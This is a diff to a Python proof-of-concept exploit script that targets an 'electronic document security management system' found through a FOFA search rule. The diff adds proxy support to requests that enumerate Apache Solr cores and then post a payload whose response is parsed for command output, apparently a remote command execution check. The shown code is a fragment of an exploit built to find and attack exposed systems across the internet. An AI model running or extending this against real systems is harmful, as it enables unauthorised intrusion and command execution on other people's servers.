@@ -3,6 +3,8 @@
 
 import requests
 import re
+
+from Config.config_proxies import proxies
 from Config.config_requests import headers
 
 requests.packages.urllib3.disable_warnings()
@@ -18,7 +20,7 @@ FOFA_RULE = 'title="电子文档安全管理系统"'
 
 def poc(target):
     try:
-        r = requests.get(target+"/solr/admin/cores",headers=headers, verify=False)
+        r = requests.get(target+"/solr/admin/cores",headers=headers, verify=False,proxies=proxies)
         if r.status_code == 200 and 'responseHeader' in r.text:
             result = re.search(
                 r'<str name="name">([\s\S]*?)</str><str name="instanceDir">', r.text, re.I
@@ -41,7 +43,7 @@ def POC_2(target, core_name):
     }
 
     try:
-        r = requests.post(url, data=files, verify=False)
+        r = requests.post(url, data=files, verify=False,proxies=proxies)
         if r.status_code == 200 and 'responseHeader' in r.text:
             cmd = re.search(
                 r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', r.text, re.I)
